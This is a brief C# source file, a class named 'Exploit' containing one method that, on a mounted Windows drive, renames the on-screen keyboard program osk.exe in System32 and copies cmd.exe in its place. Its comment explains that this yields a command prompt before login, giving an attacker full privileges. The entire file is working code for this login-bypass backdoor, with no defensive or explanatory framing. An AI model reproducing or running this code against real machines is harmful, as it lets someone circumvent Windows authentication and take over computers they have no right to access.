using System;
using System.IO;

public class Exploit
{
	public static void OverwriteOSK(DriveInfo Drive)
	{
		/*
			This method renames the file "osk.exe" in the System32 directory, to "osk.exe.old"
			Next, it makes a copy of the cmd.exe file and renames that copy to "osk.exe"
			This allows one to run a command prompt before login. Thus, giving the attacker full privilages to the entire OS.
		*/
		
		if (Helpers.DriveHasWindows(Drive) == true)
		{
			File.Move(Drive.Name + "Windows\\System32\\osk.exe", Drive.Name + "Windows\\System32\\osk.exe.old"); // Rename osk.exe to osk.exe.old
			
			File.Copy(Drive.Name + "Windows\\System32\\cmd.exe", Drive.Name + "Windows\\System32\\osk.exe"); // Copy cmd.exe over osk.exe
		}
	}
}